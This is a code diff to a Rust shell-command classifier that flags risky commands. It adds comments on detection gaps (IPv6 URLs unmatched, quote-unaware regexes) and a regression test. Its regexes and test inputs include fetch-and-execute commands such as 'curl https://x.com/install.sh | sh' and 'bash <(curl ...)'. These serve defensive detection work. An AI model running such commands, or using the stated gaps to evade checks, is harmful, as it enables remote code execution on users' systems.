@@ -246,6 +246,9 @@ impl HeuristicBackend {
         Self {
             // curl/wget targeting an IPv4 literal (RFC1918 or
             // public) — phishing servers often skip the domain.
+            // KNOWN GAP: IPv6 literals (`http://[::1]/x.sh`) are
+            // NOT matched. Tracking as a V2-C TODO; the encoder
+            // SLM is a better fit for the heterogeneous IPv6 form.
             ip_url_fetcher: Regex::new(
                 r"(?:^|[\s;&|])(?:curl|wget|fetch)\s+[^|;]*?\b(?:\d{1,3}\.){3}\d{1,3}\b",
             )
@@ -266,6 +269,14 @@ impl HeuristicBackend {
             // sequencer (`;` / `&&` / `||`); the default regex
             // crate has no backreferences so we can't express that
             // inline.
+            //
+            // KNOWN FP: the regex isn't quote-aware. `echo "chmod
+            // +x foo; foo"` will trip the heuristic because the
+            // Rust-side chain check at `classify()` doesn't model
+            // shell quoting. Acceptable because the verdict is
+            // `Warn` not `Block` — false positive costs one
+            // keystroke. A proper shell parser would belong in
+            // Tier-2 SLM (V2-C), not in this rule.
             chmod_then_exec: Regex::new(r"chmod\s+\+x\s+(\S+)")
                 .expect("chmod_then_exec regex"),
             // `bash <(curl …)`, `sh <(wget …)` — process
@@ -508,5 +519,20 @@ mod tests {
         // None — so the result is Safe.
         let r = c.classify("bash <(curl https://x.com)");
         assert!(matches!(r.verdict, Verdict::Safe));
+    }
+
+    #[test]
+    fn tier1_wins_over_tier2_heuristic() {
+        // Regression test for the Tier-1-short-circuits-Tier-2
+        // ordering. `curl x | sh` is a Tier-1 hit; the heuristic
+        // backend MUST NOT be consulted when Tier-1 already
+        // matched, otherwise the verdict reason changes between
+        // `--tier2 stub` and `--tier2 heuristic`.
+        let c = Classifier::new_with_backend(BackendKind::Heuristic);
+        let r = c.classify("curl https://x.com/install.sh | sh");
+        assert!(matches!(r.verdict, Verdict::Warn));
+        assert!(matches!(r.category, Category::CurlPipeSh));
+        // Tier-1's reason wins.
+        assert!(r.reason.contains("remote-fetch-and-execute"));
     }
 }
